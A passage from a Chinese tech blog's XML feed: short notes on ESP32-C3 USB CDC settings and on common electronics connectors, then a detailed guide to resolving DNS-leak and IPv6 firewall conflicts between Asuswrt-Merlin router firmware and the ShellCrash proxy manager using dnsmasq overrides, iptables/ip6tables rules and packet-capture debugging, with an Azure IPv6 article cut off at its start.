class="hljs-number">115200</span><br></code></pre></td></tr></table></figure><p><code>ARDUINO_USB_CDC_ON_BOOT</code> 可以实现上电自动打开 CDC，否则需要手动在按住 BOOT 的情况下按 RST 来进入 CDC 下载模式。</p><blockquote><p>注意如果程序运行时也通过 pinMode 更新了 IO18 和 IO19 的功能，那他们就会变成普通 GPIO，没法使用 CDC。</p></blockquote><p>参考：<a href="https://community.platformio.org/t/broken-esp32-c3-config-build-after-moving-to-arduino-esp32-v2-0-0-rc1/22817/14">https://community.platformio.org/t/broken-esp32-c3-config-build-after-moving-to-arduino-esp32-v2-0-0-rc1/22817/14</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>PlatformIO</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各种连接器总结</title>
    <link href="/archives/e023069a/"/>
    <url>/archives/e023069a/</url>
    
    <content type="html"><![CDATA[<h3 id="JST-连接器"><a href="#JST-连接器" class="headerlink" title="JST 连接器"></a><strong>JST 连接器</strong></h3><p>JST（Japan Solderless Terminal）是日本压着端子公司的标准，型号通常以 <strong>字母+引脚间距（mm）</strong> 命名：</p><h4 id="GH1-25"><a href="#GH1-25" class="headerlink" title="GH1.25"></a><strong>GH1.25</strong></h4><ul><li>带一侧锁扣，按压解锁。 </li><li>尺寸小，锁扣长长的长满卡扣。</li><li>常见母座：卧贴。</li></ul><h4 id="XH2-54"><a href="#XH2-54" class="headerlink" title="XH2.54"></a><strong>XH2.54</strong></h4><ul><li>尺寸较大，公头有竖向栅格与母座栅格对齐</li><li>无按压触发的卡扣，插拔直接拉开栅格两侧卡扣。</li><li>标准间距实际上是 <strong>2.5mm</strong>，如果有一长排的 2.54 排针焊盘，XH 端子和排针焊盘其实是不兼容的。（没人知道 XH2.54mm这个名字从哪里传出来的）。</li><li>常见母座：直针、卧针。</li></ul><p>更多参见：认识端子座 UP主: 水螺母 - <a href="https://www.bilibili.com/video/BV16T4y1D7aR">https://www.bilibili.com/video/BV16T4y1D7aR</a></p><hr><h4 id="螺旋式接线端子（Screw-Terminal）"><a href="#螺旋式接线端子（Screw-Terminal）" class="headerlink" title="螺旋式接线端子（Screw Terminal）"></a><strong>螺旋式接线端子（Screw Terminal）</strong></h4><ul><li>通过螺丝压紧导线的接线端子。适合粗导线或 10A 以上高电流。<ul><li><strong>直插式</strong>  </li><li><strong>栅栏式</strong> 塑料条分隔</li></ul></li></ul><h4 id="Molex-连接器"><a href="#Molex-连接器" class="headerlink" title="Molex 连接器"></a><strong>Molex 连接器</strong></h4><ul><li>常见于大的板对板连接</li><li>电脑电源和主板各组件之间的接口也是这种</li></ul><h4 id="USB"><a href="#USB" class="headerlink" title="USB"></a><strong>USB</strong></h4><ul><li><strong>牢固程度</strong>：Type-B（正方口）&gt; Type-C &gt; Type-A</li><li><strong>Type-B 大家族</strong>：Type-B &gt; Mini-B（比 micro 高一点） &gt; MicroB</li></ul><h4 id="FPC"><a href="#FPC" class="headerlink" title="FPC"></a><strong>FPC</strong></h4><ul><li>蓝白色 FPC 常见间距：0.5mm</li></ul>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>梅林固件与 ShellCrash 的冲突 - 关于 iptables 与 Dnsmasq</title>
    <link href="/archives/6b93c6c3/"/>
    <url>/archives/6b93c6c3/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ShellCrash 按设计能够在各种基于&#x2F;类似 OpenWrt 的系统上方便地配置管理 mihomo、singbox 之类的代理内核。但由于 Merlin（梅林）固件的许多组件都有自己的实现，ShellCrash 在 Merlin 上运行可能遇到各种各样的问题。</p><p>这篇指南包含对 iptables、ShellCrash、Dnsmasq 运作方式的说明，使用了很多强制覆写之类的 hack，如果你也遇到了各种奇奇怪怪的问题，希望可以提供一些参考</p><p>这篇指南应该也同样适用于 OpenClash 之类的程序，由于 Merlin 固件可能因更新导致部分特性变化，所以注意本指南特别适用于 Merlin 3004.388.8 (388.8) 版本以及 ShellCrash 1.9.0release 版本，ShellCrash 升级到 beta 后部分功能可能有改善，但也有更多不兼容（截止 1.9.1beta13）。本指南下，路由器 IP 为 192.168.50.1，如果没改过网段，这也是默认值</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>ShellCrash 默认的 DNS 配置是很够用的，然而你如果发现无论怎么配置，用 <a href="https://ipleak.net/">https://ipleak.net</a> 或 <a href="https://browserleaks.com/dns">https://browserleaks.com/dns</a> 之类的网站仍能找到运营商 DNS 泄露，或者间歇性的泄露话，那很可能不是你 <strong>内核</strong> DNS 配置的问题，而是 ShellCrash 没能正确将所有 DNS 请求劫持到 <strong>内核</strong> 中</p><div class="note note-light">            <p>内核 DNS 配置无误的情况下，除了 ShellCrash 对 DNS 请求劫持不完善可能导致问题，问题也有可能是 Windows 智能多宿主名称解析（Link-Local Multicast Name Resolution）导致的，此种情况可以自行搜索解决，不在这篇指南的讨论范围内</p>          </div><h3 id="确认问题"><a href="#确认问题" class="headerlink" title="确认问题"></a>确认问题</h3><p>如果你没修改端口，那 ShellCrash 默认会让内核 DNS 监听 <strong>1053</strong> 端口，也会通过 iptables 将 53 端口转发至 1053</p><p>你可以在设备上尝试运行 <code>dig google.com @192.168.50.1</code> 和 <code>dig google.com @192.168.50.1 -p 1053</code>。如果后者能得到正确的 IP（或 fakeip），而前者只能得到国内污染后的 IP，那就说明 ShellCrash 对 DNS 请求的劫持存在问题，需要自己重新定向 DNS</p><h3 id="Merlin-中的-DNS"><a href="#Merlin-中的-DNS" class="headerlink" title="Merlin 中的 DNS"></a>Merlin 中的 DNS</h3><p>而 Merlin 有许多处地方可以配置 DNS，配置及其复杂，说明又不甚清晰，这里就我的理解说明一下</p><h4 id="LAN-DNS-Director"><a href="#LAN-DNS-Director" class="headerlink" title="LAN - DNS Director"></a>LAN - DNS Director</h4><p>这是华硕&#x2F;Trend Micro 自己实现的优先级最高的 DNS 重定向工具，主要用于 <em>家长控制</em> 类功能，通常不应该用 DNS Director 设置 DNS</p><div class="note note-light">            <p>根据<a href="https://github.com/RMerl/asuswrt-merlin.ng/wiki/DNS-Director"><em>文档</em></a>，在较老的 Merlin 固件中，DNS Director 叫做 DNSFilter</p>          </div><h4 id="LAN-DHCP-服务器-DNS-及-WINS-服务器设置"><a href="#LAN-DHCP-服务器-DNS-及-WINS-服务器设置" class="headerlink" title="LAN - DHCP 服务器 - DNS 及 WINS 服务器设置"></a>LAN - DHCP 服务器 - DNS 及 WINS 服务器设置</h4><p>此处配置的 DNS 只是在分配 IP 的时候指定，默认就是 192.168.50.1，交由路由器处理，同时也可配置“Advertise router’s IP in addition to user-specified DNS”，即 在用户指定的 DNS 之外，还附上路由器的 IP。通常全部交给路由器处理即可</p><h4 id="WAN-互联网-DNS-设置"><a href="#WAN-互联网-DNS-设置" class="headerlink" title="WAN - 互联网 DNS 设置"></a>WAN - 互联网 DNS 设置</h4><p>此处配置的 DNS 是 <strong>路由器本身 Dnsmasq</strong> 的 DNS 配置，即关于 192.168.50.1:53 的配置，默认自动使用运营商 DNS。会影响路由器自己的网络，如果设备将 DNS 请求交给路由器（如 DHCP 分配路由器 IP 作为 DNS 服务器的情况下），也会影响连接到该路由器的设备</p><p>Merlin 内置 Dnsmasq 用于处理 DNS，Dnsmasq 的配置位于 <code>/etc/dnsmasq.conf</code>，其中引用了 <code>servers-file=/tmp/resolv.dnsmasq</code> ，而 WAN 处的 DNS 配置就正对应了 <code>/tmp/resolv.conf</code> 的内容</p><div class="note note-light">            <p>根据<a href="https://github.com/RMerl/asuswrt-merlin.ng/wiki/Custom-domains-with-dnsmasq"><em>文档</em></a>，你可以通过 <code>/jffs/configs/dnsmasq.conf.add</code> 在 Dnsmasq 配置末尾添加新配置。但这种方式不适用于解决 DNS 泄露问题，因为 Dnsmasq 会并发所有 DNS 服务器，即使配置为 <code>strict-order</code> 也会因所添加的配置在配置末尾，导致顺序上不优先使用设定的 DNS 服务器</p>          </div><h3 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h3><p>管理面板中以上三处都能改 DNS，然而都被限制不能自定义 DNS 服务器的端口。内核监听的是 1053 端口，肯定需要自定义端口，所以我们要自己覆写 Dnsmasq 配置：</p><ol><li>在开始之前，为防止与我们自己的 DNS 处理冲突，你要在 crash 菜单的 7-6-7 处（新版可能变化）禁用 ShellCrash 自己的 DNS 劫持</li><li>我们要修改的是 <code>/tmp/resolv.dnsmasq</code> 的配置，可以先确认一下这个配置的内容，用 <code>cp /tmp/resolv.dnsmasq /tmp/resolv.dnsmasq.bak</code> 备份原始配置</li><li>然后运行 <code>echo &quot;server=192.168.50.1#1053&quot; &gt; /tmp/resolv.dnsmasq</code> 覆写原配置。用 # 表示端口</li><li>用 <code>service restart_dnsmasq</code> 重启 Dnsmasq 服务</li></ol><h4 id="User-script-防覆盖"><a href="#User-script-防覆盖" class="headerlink" title="User script 防覆盖"></a>User script 防覆盖</h4><p>为防止配置重新被 Merlin 改写回去，你可以通过 Merlin 的 <a href="https://github.com/RMerl/asuswrt-merlin.ng/wiki/User-scripts">User script</a> 功能在路由器启动后自动覆写配置</p><p>比如，你可以创建 <code>/jffs/scripts/override-dnsmasq.sh</code> 并粘贴上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">执行 Dnsmasq 复写</span><br>cp /tmp/resolv.dnsmasq /tmp/resolv.dnsmasq.bak # 备份原始<br>echo &quot;server=192.168.50.1#1053&quot; &gt; /tmp/resolv.dnsmasq<br>service restart_dnsmasq<br></code></pre></td></tr></table></figure><div class="note note-light">            <p>可以自己试运行一下。注意还要 <code>chmod +x /jffs/scripts/override-dnsmasq.sh</code> 为 .sh 文件添加执行权限</p>          </div><p>然后在 <code>/jffs/scripts/nat-start</code> 或其他 User script Hook 点（大多数都可以）中添加 <code>sh /jffs/scripts/override-dnsmasq.sh</code> 来自动执行这个脚本</p><div class="note note-light">            <p>ShellCrash 默认也是在 nat-start 处初始化 ShellCrash 的，添加后 nat-start 看起来应该像这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/jffs/ShellCrash/start.sh init #ShellCrash初始化脚本<br><br>sh /jffs/scripts/start-services.sh<br></code></pre></td></tr></table></figure>          </div><h3 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h3><p>DNS 配置完成了🎉</p><p>回到 <a href="#%E7%A1%AE%E8%AE%A4%E9%97%AE%E9%A2%98">确认问题</a> 并用 <a href="https://ipleak.net/">https://ipleak.net</a> 或 <a href="https://browserleaks.com/dns">https://browserleaks.com/dns</a> 之类的网站来检查一下还有没有问题吧！</p><div class="note note-light">            <p>如果你有对国内网站设置国内的 DNS，那还可以用网易的 <a href="https://nstool.netease.com/">https://nstool.netease.com</a> 这个网站来检查你在国内使用的 DNS 服务器</p>          </div><h3 id="本机代理问题"><a href="#本机代理问题" class="headerlink" title="本机代理问题"></a>本机代理问题</h3><p>实际上，完成以上步骤之后，设备应当就已经能够正常上网了。然而，由于对 Dnsmasq 的配置，路由器本身（本机）进行 DNS 解析时也会通过内核的  <code>192.168.50.1#1053</code> DNS 进行，而如果你在使用 fakeip 模式，并没有配置本机代理的话，那便会导致 <strong>路由器自己</strong> 无法正常上网，因为路由器解析出的是 fakeip，而出站流量却不经过内核，那 fake 的 ip 肯定就连不上了</p><p>这个问题有两种解法：</p><ol><li>如果你希望本机也能代理，那需要让本机流量也走内核。但 ShellCrash 目前版本（1.9.0release）对本机代理的支持并不很好，只支持以“环境变量”的方式代理。你当然可以尝试自己用 iptables 在 OUTPUT 链上设置规则，只是会比较折腾</li><li>如果你认为本机没必要代理，那可以只劫持本机自己的 DNS 请求，重定向到一个能正常解析出 <strong>真 IP</strong> 的 DNS 服务器。这种情况下，你需要执行这条命令来通过 iptables 设置劫持：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">iptables -t nat -A OUTPUT -p udp --dport 53 -d 192.168.50.1 -j DNAT --to-destination 8.8.8.8<br></code></pre></td></tr></table></figure><p>这个命令会在 nat 表的 OUTPUT 链中要求 NAT 将向 <code>192.168.50.1:53</code> 请求的目标地址转换为 <code>8.8.8.8(:53)</code></p><p>由于这个规则在 OUTPUT 链上，所以它不会影响到连接路由器的其他设备，而只影响路由器本机，详细原理可参考以下 <a href="#iptables-%E8%BF%90%E4%BD%9C%E6%96%B9%E5%BC%8F">iptables 运作方式</a></p><p>当然你也可以像<a href="#user-script-%E9%98%B2%E8%A6%86%E7%9B%96">上面</a>一样把这个命令添加到 User script 的 <code>firewall-start</code> Hook 点上，可以使用这个脚本避免规则被重复添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">重定向路由器 DNS</span><br>DNS_RULE=&quot;OUTPUT -p udp --dport 53 -d 192.168.50.1 -j DNAT --to-destination 8.8.8.8&quot;<br><br>if ! iptables -t nat -C $DNS_RULE 2&gt;/dev/null; then<br>    iptables -t nat -A $DNS_RULE<br>fi<br></code></pre></td></tr></table></figure><p>其中 <code>-C</code> flag 即用于确认该规则是否存在， <code>2&gt;/dev/null</code> 用于处理错误输出（规则不存在即报错）</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>除了 DNS 问题，Merlin 自带的防火墙配置，尤其是 防火墙 - <strong>IPv6 防火墙</strong> 也会与 ShellCrash 对 IPv6 的流量劫持产生冲突</p><h3 id="确认问题-1"><a href="#确认问题-1" class="headerlink" title="确认问题"></a>确认问题</h3><p>实际上解决这个问题最简单的方式就是取消勾选 <code>启动 IPv6 防火墙</code>。如果关闭 IPv6 防火墙 后网络不存在问题，那便可以确定问题就出在这里</p><p>当然关闭整个 IPv6 防火墙肯定是存在安全风险的，Merlin 内建的防火墙其实基于一条条 iptables 规则，IPv6 防火墙则基于 <strong>ip6tables</strong> ，最好是搞清楚防火墙的运作原理，并自己正确配置它们</p><h3 id="iptables-运作方式"><a href="#iptables-运作方式" class="headerlink" title="iptables 运作方式"></a>iptables 运作方式</h3><p>iptables 内建于 Merlin 固件中，用于控制数据包的处理和转发，你可以在它各个 <strong>表</strong> 的各个 <strong>链</strong> 上设置规则</p><pre><code class="mermaid" >flowchart BT    subgraph 网络层输入        in(["输入"]) --> PREROUTING        PREROUTING --> routing(["路由决策"])    end    subgraph 本机        routing(["路由决策"]) --> INPUT        INPUT --> local(("本机（ShellCrash）"))        local(("本机（ShellCrash）")) --> OUTPUT    end    subgraph 转发处理        routing(["路由决策"]) --> FORWARD    end    subgraph 网络层输出        FORWARD --> POSTROUTING        OUTPUT --> POSTROUTING        POSTROUTING --> out(["输出"])    end    style 本机 fill:#f9f,stroke:#333,stroke-width:2px    style 转发处理 fill:#bbf,stroke:#333,stroke-width:2px    style 网络层输入 fill:#ff9,stroke:#333,stroke-width:2px    style 网络层输出 fill:#ff9,stroke:#333,stroke-width:2px</code></pre><p>这个流程图中的 方框 如 <code>PREROUTING</code> 、 <code>FORWARD</code> 即属于不同 <strong>表</strong> 中的 <strong>链</strong></p><p>主要有四张表：</p><ul><li>filter</li><li>mangle</li><li>nat</li><li>raw</li></ul><p>五条链：</p><ul><li>PREROUTING</li><li>FORWARD</li><li>INPUT</li><li>OUTPUT</li><li>POSTROUTING</li></ul><p>即常说的“四表五链”</p><p>当然也可能有其他各种表和链，比如 <code>security</code> 表，还有 ShellCrash 会在 mangle 表创建的 <code>shellcrashv6</code> 链，但我们通常不用动那些表和链</p><h4 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h4><p>比如，你可以通过 <code>ip6tables -t filter -nvL INPUT</code> 查看 filter 表中 INPUT 链上的规则，规则从上往下按顺序匹配</p><p>其中：</p><ul><li>t [map] 用于指定要查哪张表，实际上不填默认就是 <code>filter</code> 表</li><li>n 表示不对 ip 进行域名解析，让返回快很多</li><li>v 表示更多信息，比如 <code>pkts</code> 和 <code>bytes</code> 列</li><li>L 表示列出规则</li></ul><p>你还可以用 <code>ip6tables-save</code> 查看现有的所有表，并得到 <strong>可以作为命令来添加执行</strong> 的格式</p><p>ShellCrash 也是靠 iptables <strong>劫持流量</strong> 的。以 tproxy 模式举例，ShellCrash 会在 PREROUTING 中通过 tproxy（透明代理）和路由表将本该通过 FORWARD 到公网的流量， <strong>重定向到本机的 INPUT</strong> ，并在 mihomo&#x2F;sing-box 内核中处理流量</p><p>由于 PREROUTING 链位于 mangle 表，所以你可以通过<code>ip6tables -t mangle -nvL</code> 查看整个 mangle 表的内容，其中包括了 ShellCrash 在 PREROUTING 链设置的规则，也包括了它自己创建的 <code>shellcrashv6</code> 链。输出应该形似这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">Chain PREROUTING (policy ACCEPT 1843K packets, 2274M bytes)<br> pkts bytes target     prot opt in     out     source               destination         <br>2176K 2300M shellcrashv6  tcp      *      *       ::/0                 ::/0                <br> 107K   54M shellcrashv6  udp      *      *       ::/0                 ::/0                <br><br>Chain INPUT (policy ACCEPT 2294K packets, 2355M bytes)<br> pkts bytes target     prot opt in     out     source               destination         <br><br>Chain FORWARD (policy ACCEPT 40213 packets, 3977K bytes)<br> pkts bytes target     prot opt in     out     source               destination         <br><br>Chain OUTPUT (policy ACCEPT 1694K packets, 2232M bytes)<br> pkts bytes target     prot opt in     out     source               destination         <br><br>Chain POSTROUTING (policy ACCEPT 1739K packets, 2236M bytes)<br> pkts bytes target     prot opt in     out     source               destination         <br><br>Chain shellcrashv6 (2 references)<br> pkts bytes target     prot opt in     out     source               destination         <br>22957 1991K RETURN     udp      *      *       ::/0                 ::/0                 udp dpt:53<br> 6309  460K RETURN     all      *      *       ::/0                 240x:xxxx:xxxx:xxxx::/64 <br>1748K 2264M RETURN     all      *      *       ::/0                 240x:xxxx:xxxx:xxxx::/64 <br>    0     0 RETURN     all      *      *       ::/0                 ::/128              <br>    0     0 RETURN     all      *      *       ::/0                 ::1/128             <br>    0     0 RETURN     all      *      *       ::/0                 ::ffff:0.0.0.0/96   <br>   13  1040 RETURN     all      *      *       ::/0                 64:ff9b::/96        <br>    0     0 RETURN     all      *      *       ::/0                 100::/64            <br> 1360 97998 RETURN     all      *      *       ::/0                 2001::/32           <br>    0     0 RETURN     all      *      *       ::/0                 2001:20::/28        <br>    0     0 RETURN     all      *      *       ::/0                 2001:db8::/32       <br>   41  4670 RETURN     all      *      *       ::/0                 2002::/16           <br> 4400  348K RETURN     all      *      *       ::/0                 fc00::/7            <br>   25  4350 RETURN     all      *      *       ::/0                 fe80::/10           <br> 5737 1554K RETURN     all      *      *       ::/0                 ff00::/8            <br> 463K   79M TPROXY     tcp      *      *       240x:xxxx:xxxx:xxxx::/64  ::/0                 TPROXY redirect :::7893 mark 0x1ed4/0xffffffff<br>    0     0 TPROXY     tcp      *      *       240x:xxxx:xxxx:xxxx::/64  ::/0                 TPROXY redirect :::7893 mark 0x1ed4/0xffffffff<br>32340 6248K TPROXY     udp      *      *       240x:xxxx:xxxx:xxxx::/64  ::/0                 TPROXY redirect :::7893 mark 0x1ed4/0xffffffff<br>    0     0 TPROXY     udp      *      *       240x:xxxx:xxxx:xxxx::/64  ::/0                 TPROXY redirect :::7893 mark 0x1ed4/0xffffffff<br></code></pre></td></tr></table></figure><p>表的内容都很好理解。其中：</p><ul><li><code>pkts</code> 指通过这条规则的包数</li><li><code>bytes</code> 指通过这条规则的字节数</li></ul><p>可以用来确定规则有没有在正常工作</p><h3 id="Merlin-中的防火墙"><a href="#Merlin-中的防火墙" class="headerlink" title="Merlin 中的防火墙"></a>Merlin 中的防火墙</h3><p><img src="https://cdn.jiecs.top/img/2024/08/1000013046.webp" alt="FORWARD diff"></p><p><img src="https://cdn.jiecs.top/img/2024/08/1000013045.webp" alt="INPUT diff"></p><p>通过对比关闭和开启 IPv6 防火墙的 ip6tables 规则，可以注意到：</p><ul><li>在 FORWARD 链，多了根据面板设置的端口白名单（ACCEPT）。同时顶部的 policy（即默认策略），从 ACCEPT 变成了 DROP（即丢弃）</li><li>在 INPUT 链，最下面多了一条全部 DROP 的规则</li></ul><p>相当于</p><pre><code class="mermaid" >flowchart BT    subgraph 网络层输入        in(["输入"]) --> PREROUTING        PREROUTING --> routing(["路由决策"])    end    subgraph 本机        routing(["路由决策"])  --x |"DROP"| INPUT        INPUT --> local(("本机"))        local(("本机（ShellCrash）")) --> OUTPUT    end    subgraph 转发处理        routing(["路由决策"])  --x |"非白名单就 DROP"| FORWARD    end    subgraph 网络层输出        FORWARD --> POSTROUTING        OUTPUT --> POSTROUTING        POSTROUTING --> out(["输出"])    end    style 本机 fill:#f9f,stroke:#333,stroke-width:2px    style 转发处理 fill:#bbf,stroke:#333,stroke-width:2px    style 网络层输入 fill:#ff9,stroke:#333,stroke-width:2px    style 网络层输出 fill:#ff9,stroke:#333,stroke-width:2px    linkStyle 5 stroke:red    linkStyle 2 stroke:red</code></pre><p>FORWARD 链对 ShellCrash 应当没有影响</p><p>但参照<a href="#%E5%91%BD%E4%BB%A4%E8%A1%8C">此处</a>对 ShellCrash 原理的说明，ShellCrash 劫持的流量肯定要 <strong>经过 INPUT</strong> ，到本机的内核里去处理。而本机的 INPUT 入站始终被 DROP，自然便无法正常使用 IPv6 了</p><h3 id="开始操作-1"><a href="#开始操作-1" class="headerlink" title="开始操作"></a>开始操作</h3><p>要解决这一问题，自然就是要让 ShellCrash 劫持的流量不被 DROP 掉。从问题出发，主要有两种办法</p><h4 id="方法一：在-DROP-规则的上面插入-ACCEPT-规则"><a href="#方法一：在-DROP-规则的上面插入-ACCEPT-规则" class="headerlink" title="方法一：在 DROP 规则的上面插入 ACCEPT 规则"></a>方法一：在 DROP 规则的上面插入 ACCEPT 规则</h4><p>用 <code>ip6tables -I INPUT 1 -i ppp0 -j ACCEPT</code> 在 INPUT 链的首位插入”对所有来自 ppp0 网络接口（IPv6）的流量都 ACCEPT”规则</p><p>其中</p><ul><li><code>-I [Chain] 1</code> 即表示在指定链的第 1 位插入规则</li></ul><h4 id="方法二：删去原本的-DROP-规则"><a href="#方法二：删去原本的-DROP-规则" class="headerlink" title="方法二：删去原本的 DROP 规则"></a>方法二：删去原本的 DROP 规则</h4><p>用 <code>ip6tables -D INPUT -j DROP</code> 直接删掉那条 DROP 规则</p><p>其中</p><ul><li><code>-D [Chain]</code> 即表示在指定链中删除规则</li></ul><p>两种方法都可以，也同样需要把这个命令添加到 User script 的 <code>firewall-start</code> Hook 点上，参照<a href="#user-script-%E9%98%B2%E8%A6%86%E7%9B%96">上文</a></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>如果你在折腾的过程中遇到了很奇怪的问题，可以用这些小工具小技巧方便调试、透析流量</p><h3 id="Entware"><a href="#Entware" class="headerlink" title="Entware"></a>Entware</h3><p><a href="https://github.com/Entware/Entware">Entware</a> 是一个强大的适用于嵌入式的包管理器，即使路由器固件不是 OpenWrt，也可使用 <code>opkg</code> 之类的命令</p><p>Merlin 固件内建了 <em>amtm - the Asuswrt-Merlin Terminal Menu</em> ，方便你在 Merlin 上安装 Entware 之类的程序</p><ol><li>运行 <code>amtm</code>打开 amtm，第一次打开可能要求配置主题，可以直接选第一个</li><li>在 amtm 中，输入 <code>i</code> 可查看所有可用的程序，参照指示输入 <code>ep</code> 即可在一个 U 盘上安装 entware</li></ol><p>事实上 Merlin 内建的 SSH 服务端是不支持 SFTP 的，而有了 Entware，你便可以直接输入 <code>opkg install openssh-sftp-server</code> 来安装 sftp。不需要任何配置，也不用折腾 FTP 之类的，随便找一个 SFTP 的客户端即可轻松管理路由器中的文件系统</p><h3 id="用-Wireshark-在路由器上抓包"><a href="#用-Wireshark-在路由器上抓包" class="headerlink" title="用 Wireshark 在路由器上抓包"></a>用 Wireshark 在路由器上抓包</h3><p>Wireshark 作为很强大的抓包工具，支持通过 SSH 连接远程设备并通过 tcpdump&#x2F;dumpcap 抓取流量。自然也可以连接到路由器的 SSH 上抓包</p><ol><li>Merlin 固件并不内建 tcpdump，参照<a href="#entware">以上</a>说明安装 Entware 之后，你便也可以通过 <code>opkg</code> 安装来安装 tcpdump</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">opkg install tcpdump<br></code></pre></td></tr></table></figure><ol start="2"><li>打开 Wireshark 客户端，打开 <code>捕获 - 选项</code></li></ol><p><img src="https://cdn.jiecs.top/img/2024/08/1000013055.webp" alt="Wireshark 首页"></p><ol start="3"><li>选中 <code>SSH remote capture:sshdump</code>，点击它的设置</li></ol><p><img src="https://cdn.jiecs.top/img/2024/08/1000013056.webp" alt="捕获选项"></p><ol start="4"><li>在 Server 和 Authentication 页配置路由器的 SSH 连接信息，并在 Capture 页中设置 Remote interface 和 Remote capture filter</li></ol><p><img src="https://cdn.jiecs.top/img/2024/08/1000013057.webp" alt="接口选项"></p><p>Remote interface 即所抓包的网络接口，主要可以为：</p><ul><li>ppp0 即 IPv6 的接口</li><li>br0 即内网接口</li></ul><p>可以通过 <code>ip a</code> 查看所有可用的网络接口和对应的 IP</p><p>Remote capture filter 是总的过滤器，建议用 <code>not port [SSH_PORT]</code> 过滤掉 Wireshark 客户端自己抓包的 SSH 数据</p><ol start="5"><li>然后就可以关掉设置开始抓包了</li></ol><h3 id="用-iptables-LOG"><a href="#用-iptables-LOG" class="headerlink" title="用 iptables LOG"></a>用 iptables LOG</h3><p>iptables 不仅可以设置 ACCEPT、DROP 之类的规则，还可以设置 jump 到 LOG</p><p>例如 <code>ip6tables -I INPUT 1 -i ppp0 -m limit --limit 60/min -j LOG  --log-prefix &quot;FROM-PPP0: &quot;</code> 即可将所有符合该规则（从 ppp0 接口进入）的流量记录到日志中</p><p>其中：</p><ul><li><code>-m limit --limit 60/min</code> 用于限制记录日志的频率，包太多路由器很容易卡死</li><li><code>--log-prefix [str]</code> 即日志前缀</li></ul><div class="note note-light">            <p>注意 iptables 规则从上往下匹配，用 <code>-A</code> 来添加会把 LOG 规则放在链的最后，如果数据在前面就已经被 DROP 了那就不会记录下来。所以这里用 <code>-I [Chain] 1</code> 指定插入到链的第 1 位</p>          </div><p>可以通过 <code>dmesg | grep &quot;FROM-PPP0: &quot;</code> 来查找记录下来的流量，grep 即用于查找 log 前缀</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Azure 中通过负载均衡器零成本开启 IPv6 支持</title>
    <link href="/archives/90ab79b3/"/>
    <url>/archives/90ab79b3/</url>
    
    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>Azure 中 IP、负载均衡器 等产品都分 SKU（Stock Keeping Unit），可以理解为等级。SKU 通常分为 基本（Basic） 和 标准（Standard）。标准的功能会相对好一点，例如：</p><table><thead><tr><th>产品</th><th>基本 SKU</th><th>标准 SKU</th></tr></thead><tbody><tr><td>公共 IP</td><td>动态分配，静态要额外收钱</td><td>静态分配</td></tr><tr><td>负载均衡器</td><td>健康探针仅支持 TCP、HTTP，不提供 SLA 保证</td><td>健康探针支持 TCP、HTTP、HTTPS</td></tr></tbody></table><p><strong>基本 SKU 的服务通常免费</strong> 或相对便宜，而标准的则要贵许多。而对大多数个人而言，标准 SKU 多出的功能、可靠性并不值得多花那么多钱，一般都会选择 基本 SKU</p><div class="note note-light">            <p>最近 Azure 又发了个<a href="https://azure.microsoft.com/zh-cn/updates/upgrade-to-standard-sku-public-ip-addresses-in-azure-by-30-september-2025-basic-sku-will-be-retired"> <em>公告</em> </a>说要在 2025 年弃用 基本 SKU 的公共 IP、负载均衡器等产品，但起码目前还能用</p>          </div><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>此前，恶心的 Azure 都把 IPv6 和 IPv4 